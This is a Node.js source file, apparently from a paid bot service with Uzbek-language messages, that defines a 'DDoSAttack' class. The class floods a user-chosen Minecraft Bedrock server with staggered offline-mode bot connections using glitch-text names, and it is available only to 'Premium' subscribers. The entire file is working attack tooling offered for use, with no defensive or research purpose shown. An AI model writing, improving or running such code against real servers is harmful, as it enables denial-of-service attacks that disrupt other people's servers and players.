const bedrock = require('bedrock-protocol');
const { isPremium } = require('./database.js');

class DDoSAttack {
  constructor(userId) {
    if (!isPremium(userId)) {
      throw new Error('DDoS faqat Premium obunachilar uchun!');
    }
    
    this.userId = userId;
    this.attacks = new Map();
    this.activeBots = new Set();
  }
  
  getDDOSBotName(index) {
    return `T̴̊͛̿͛̈́̍̐̒́͂̋͌̚͝_${index}`;
  }
  
  async startAttack(ip, port, version = '1.21.50', botCount = 5) {
    if (!isPremium(this.userId)) {
      throw new Error('Premium obuna kerak!');
    }
    
    const attackId = Date.now().toString();
    
    console.log(`🚀 DDoS boshlanmoqda: ${ip}:${port} (${botCount} bot, ${version})`);
    
    let connectedCount = 0;
    
    for (let i = 1; i <= botCount; i++) {
      const delay = i * (800 + Math.floor(Math.random() * 1200));
      
      setTimeout(() => {
        try {
          const botName = this.getDDOSBotName(i);
          
          const client = bedrock.createClient({
            host: ip,
            port: port,
            username: botName,
            offline: true,
            version: version,
            connectTimeout: 10000,
            skipPing: true,
            viewDistance: 1
          });
          
          this.activeBots.add(client);
          
          client.on('spawn', () => {
            connectedCount++;
            console.log(`✅ DDoS bot ${i} ulandi: ${botName}`);
          });
          
          client.on('error', (err) => {
            console.log(`❌ DDoS bot ${i} xato: ${err.message}`);
          });
          
          client.on('kick', (reason) => {
            console.log(`❌ DDoS bot ${i} kiklandi: ${reason}`);
          });
          
          client.on('close', () => {
            this.activeBots.delete(client);
          });
          
        } catch (error) {
          console.log(`❌ Bot ${i} yaratishda xato: ${error.message}`);
        }
      }, delay);
    }
    
    this.attacks.set(attackId, {
      id: attackId,
      ip: ip,
      port: port,
      version: version,
      botCount: botCount,
      startedAt: new Date(),
      userId: this.userId
    });
    
    return {
      success: true,
      attackId: attackId,
      message: `DDoS boshlanmoqda: ${botCount} bot ${ip}:${port} serverga`,
      bots: botCount,
      version: version
    };
  }
  
  stopAllAttacks() {
    let stoppedCount = 0;
    
    this.activeBots.forEach(bot => {
      try {
        bot.close();
        stoppedCount++;
      } catch {}
    });
    
    this.activeBots.clear();
    this.attacks.clear();
    
    return {
      success: true,
      message: `DDoS to'xtatildi`,
      stoppedBots: stoppedCount
    };
  }
  
  getActiveAttackCount() {
    return this.activeBots.size;
  }
}

module.exports = {
  DDoSAttack
};
